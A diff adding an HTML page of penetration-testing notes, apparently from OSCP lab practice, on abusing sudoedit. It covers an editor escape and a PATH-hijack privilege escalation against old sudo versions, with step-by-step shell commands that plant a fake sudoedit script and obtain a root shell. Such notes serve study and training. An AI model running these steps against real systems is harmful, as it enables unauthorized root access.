@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>sudoedit</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># sudoedit</h1></strong><br /><code>sudoedit</code> allows you to edit files with sudo permissions.<br /><br /><strong><h2>## Escape</h2></strong><br />Can try escaping the editor you get dropped into.<br /><code>sudo sudoedit &lt;file&gt;</code> → Escape<br /><br /><strong><h2>## Sudo version &lt; 1.6.9p21 and &lt; 1.7.2p4</h2></strong><br /><a href="https://www.exploit-db.com/exploits/11651">https://www.exploit-db.com/exploits/11651</a><br /><br /><strong>Examples</strong><br />• oscp 10.3.3.88 - Luigi<br /><br />It&#39;s basically a PATH exploit.<br />We write our own version of <code>sudoedit</code> that contains commands we want to run as <code>root</code>.<br />Then we execute <code>sudo ./sudoedit /etc/apache2/apache2.conf</code><br />Our own version <code>sudoedit</code> will run instead of the real one, and the commands in that file will get executed as root.<br /><br />Set up your custom <code>sudoedit</code> file<br /><div class="codebox"><div class="codebox">www-data@luigi:/var/www$&nbsp;cd&nbsp;/tmp<br />www-data@luigi:/tmp$&nbsp;echo&nbsp;&quot;#\!/bin/bash&quot;&nbsp;&gt;&nbsp;sudoedit<br />www-data@luigi:/tmp$&nbsp;echo&nbsp;&quot;su&quot;&nbsp;&gt;&gt;&nbsp;sudoedit<br />www-data@luigi:/tmp$&nbsp;echo&nbsp;&quot;/bin/su&quot;&nbsp;&gt;&gt;&nbsp;sudoedit</div></div><br /><br />Make <code>sudoedit</code> executable<br /><div class="codebox"><div class="codebox">www-data@luigi:/tmp$&nbsp;chmod&nbsp;a+x&nbsp;sudoedit</div></div><br /><br />Double-check the contents of <code>sudoedit</code><br /><div class="codebox"><div class="codebox">www-data@luigi:/tmp$&nbsp;cat&nbsp;sudoedit<br />#\!/bin/bash<br />su<br />/bin/su</div></div><br /><br />Run your privileged <code>sudoedit</code> command :)<br /><div class="codebox"><div class="codebox">www-data@luigi:/tmp$&nbsp;sudo&nbsp;./sudoedit&nbsp;/etc/apache2/apache2.conf<br />sudo&nbsp;./sudoedit&nbsp;/etc/apache2/apache2.conf<br />root@luigi:/tmp#&nbsp;</div></div><br /></div>
+</body>
+</html>
